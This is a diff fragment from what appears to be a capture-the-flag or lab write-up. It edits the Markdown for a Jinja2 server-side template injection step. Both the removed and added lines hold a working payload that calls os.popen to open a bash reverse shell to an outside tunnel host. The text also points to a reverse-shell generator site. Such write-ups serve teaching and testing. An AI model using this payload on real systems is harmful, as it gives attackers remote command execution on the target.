@@ -106,7 +106,7 @@ tcp://wqlvi-171-243-49-39.a.free.pinggy.link:42507
 
 Pick any reverse shell you like from [revshells.com](https://www.revshells.com/), then modify the payload so we can get the reverse shell.
 
-Here is my final payload: `&#123;&#123; cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/wqlvi-171-243-49-39.a.free.pinggy.link/42507 0>&1"').read() &#123;&#123;`
+Here is my final payload: `{% raw %} {{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/wqlvi-171-243-49-39.a.free.pinggy.link/42507 0>&1"').read() }} {% endraw %}`
 
 Send the payload, and we should get a reverse shell on our machine:
 
